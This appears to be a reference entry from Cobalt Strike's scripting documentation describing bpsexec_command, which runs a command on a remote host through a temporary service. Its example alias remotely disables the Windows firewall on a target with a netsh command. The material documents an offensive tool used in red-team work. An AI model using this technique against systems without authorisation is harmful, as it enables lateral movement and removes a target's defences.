bpsexec_command

Ask Beacon to run a command on a remote host. This function creates a service on the remote host, starts it, and cleans it up.

#### Arguments

`$1` - the id for the beacon. This may be an array or a single ID.

`$2` - the target to run the command on

`$3` - the name of the service to create

`$4` - the command to run.

#### Example

```
# disable the firewall on a remote target
# beacon> shieldsdown [target]
alias shieldsdown {
   bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
}```

